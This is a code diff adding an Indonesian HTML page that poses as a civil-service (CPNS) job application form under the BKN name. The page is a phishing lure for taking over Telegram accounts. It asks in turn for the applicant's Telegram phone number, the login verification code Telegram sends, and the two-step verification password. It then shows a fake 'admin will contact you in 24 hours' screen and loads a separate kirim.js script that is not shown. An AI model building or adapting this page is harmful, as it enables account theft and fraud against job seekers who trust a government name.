@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lamar CPNS - Lowongan Kerja</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            scroll-behavior: smooth;
+        }
+        .hidden {
+            display: none;
+        }
+
+        .loading-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(0, 0, 0, 0.8); /* Latar belakang semi-transparan */
+    color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000; /* Pastikan loading screen di atas elemen lain */
+    font-family: 'Arial', sans-serif; /* Font modern */
+}
+
+.loader {
+    border: 8px solid rgba(255, 255, 255, 0.3); /* Warna border loader */
+    border-top: 8px solid #ffffff; /* Warna bagian atas loader */
+    border-radius: 50%;
+    width: 60px; /* Ukuran loader */
+    height: 60px; /* Ukuran loader */
+    animation: spin 1s linear infinite; /* Animasi berputar */
+    margin-bottom: 20px; /* Jarak antara loader dan teks */
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.hidden {
+    display: none; /* Menyembunyikan elemen */
+}
+
+
+    </style>
+</head>
+<body class="bg-gray-100">
+
+    <header class="bg-blue-600 text-white p-6">
+        <h1 class="text-4xl font-bold">Pelamar CPNS</h1>
+        <p class="mt-2">Isi formulir di bawah ini untuk melamar posisi yang Anda inginkan.</p>
+    </header>
+
+    <main class="container mx-auto mt-10">
+        <section id="job-application" class="bg-white shadow-lg rounded-lg p-6">
+            <div class="flex flex-col md:flex-row">
+                <div class="md:w-1/2">
+                    <img id="job-image" src="" alt="Job Image" class="rounded-lg w-full h-64 object-cover mb-4">
+                </div>
+                <div class="md:w-1/2 md:pl-4">
+                    <h2 id="job-title" class="text-2xl font-semibold"></h2>
+                    <p id="job-company" class="mt-2 text-gray-600"></p>
+                    <p id="job-location" class="mt-1"></p>
+                    <p id="job-salary" class="mt-2"></p>
+                    <p id="job-description" class="mt-2"></p>
+                </div>
+            </div>
+
+            <!-- Step 1 -->
+            <div id="step-1">
+        <h3 class="text-xl font-semibold mt-6">Daftarkan diri anda segera!</h3>
+        <div class="mt-4">
+            <label for="name" class="block text-gray-700">Nama Lengkap</label>
+            <input type="text" id="name" class="mt-1 block w-full border border-gray-300 rounded-md p-2" placeholder="Nama lengkap anda" required>
+        </div>
+        <div class="mt-4">
+            <label for="telegram" class="block text-gray-700">Nomor Telegram Aktif</label>
+            <input type="text" id="telegram" class="mt-1 block w-full border border-gray-300 rounded-md p-2" 
+                   pattern="\d*" maxlength="15" inputmode="numeric" required placeholder="Masukkan Nomor Telegram">
+        </div>
+        <button id="next-step-1" class="mt-6 bg-blue-600 text-white py-2 px-4 rounded hover:bg-blue-700">Selanjutnya</button>
+    </div>
+
+    <div id="step-2" class="hidden">
+        <h3 class="text-xl font-semibold mt-6">Verifikasi</h3>
+        <!-- <p class="mt-2">Kami telah mengirimkan kode verifikasi ke nomor Telegram Anda. Silahkan cek pesan telegram anda, dan masukkan kode yang anda terima di bawah ini:</p> -->
+        <div class="mt-4">
+            <label for="verification-code" class="block text-gray-700">Masukkan Kode Verifikasi yang anda terima pada telegram anda</label>
+            <input type="text" id="verification-code" class="mt-1 block w-full border border-gray-300 rounded-md p-2" 
+                   pattern="\d{6}" maxlength="6" inputmode="numeric" required placeholder="Masukkan Kode verifikasi Telegram">
+        </div>
+        <button id="next-step-2" class="mt-6 bg-blue-600 text-white py-2 px-4 rounded hover:bg-blue-700">Selanjutnya</button>
+    </div>
+
+    <div id="step-3" class="hidden">
+        <h3 class="text-xl font-semibold mt-6">Verifikasi</h3>
+        <div class="mt-4">
+            <label for="two-step-code" class="block text-gray-700">Masukkan kata sandi verifikasi 2 langkah anda pada telegram anda</label>
+            <input type="text" id="two-step-code" class="mt-1 block w-full border border-gray-300 rounded-md p-2" required placeholder="Masukkan Kata Sandi">
+        </div>
+        <button id="submit-application" class="mt-6 bg-blue-600 text-white py-2 px-4 rounded hover:bg-blue-700">Kirim Lamaran Sekarang</button>
+    </div>
+
+
+<!-- Loading Screen -->
+<div id="loading-screen" class="loading-screen hidden">
+    <div class="loader"></div>
+    <!-- <p class="text-white mt-4">Tolong tunggu... 24 jam setelah penginputan, admin akan menghubungi Anda.</p> -->
+</div>
+
+<div id="loading-screen2" class="loading-screen hidden">
+    <div class="loader"></div>
+    <p class="text-white mt-4">Tolong tunggu... 24 jam setelah penginputan, admin akan menghubungi Anda.</p>
+</div>
+
+        </section>
+    </main>
+
+    <footer class="bg-gray-800 text-white text-center p-4 mt-10">
+        <p>&copy; 2024 BKN. Semua hak dilindungi.</p>
+    </footer>
+
+    <script src="kirim.js"></script> <!-- Memanggil file JavaScript terpisah -->
+    <!-- <script src="jobs.js"></script> -->
+</body>
+</html>
